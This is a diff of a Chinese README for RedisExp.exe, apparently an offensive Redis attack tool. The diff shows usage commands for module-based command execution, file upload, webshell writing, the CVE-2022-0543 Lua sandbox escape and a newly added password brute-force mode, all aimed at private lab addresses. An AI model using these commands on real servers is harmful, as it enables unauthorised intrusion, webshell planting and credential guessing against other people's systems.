@@ -46,7 +46,7 @@ RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -c who
 RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -console
 ````
 
-![1](images\1.png)
+![1](images/1.png)
 
 文件上传：
 
@@ -54,27 +54,37 @@ RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -so exp.so -exec -conso
 RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -upload -rfile 1.txt -lfile 2.txt
 ```
 
-![2](images\2.png)
+![2](images/2.png)
 
 
 
 #### 备份写 Webshell
 
 ```
-RedisExp.exe -rhost 192.168.211.128 -lhost 192.168.211.1 -shell
+RedisExp.exe -rhost 192.168.211.128 -shell
 ```
 
-![3](images\3.png)
+![3](images/3.png)
 
 
 
 #### Lua沙盒绕过命令执行 CVE-2022-0543
 
 ```
-RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -lua -console
+RedisExp.exe -rhost 192.168.211.130 -lua -console
 ```
 
-![4](images\4.png)
+![4](images/4.png)
+
+
+
+#### 爆破 Redis 密码
+
+```
+RedisExp.exe -r 192.168.211.128 -brute -pwdf ../pass.txt
+```
+
+![4](images/5.png)
 
 
 
@@ -82,7 +92,7 @@ RedisExp.exe -rhost 192.168.211.130 -lhost 192.168.211.1 -lua -console
 
 本工具基于大量优秀文章和工具才得以编写完成，非常感谢这些无私的分享者！
 
-- https://github.com/tporadowski/redis
+- https://github.com/zyylhn/redis_rce
 - https://github.com/0671/RabR
 - https://github.com/r35tart/RedisWriteFile
 
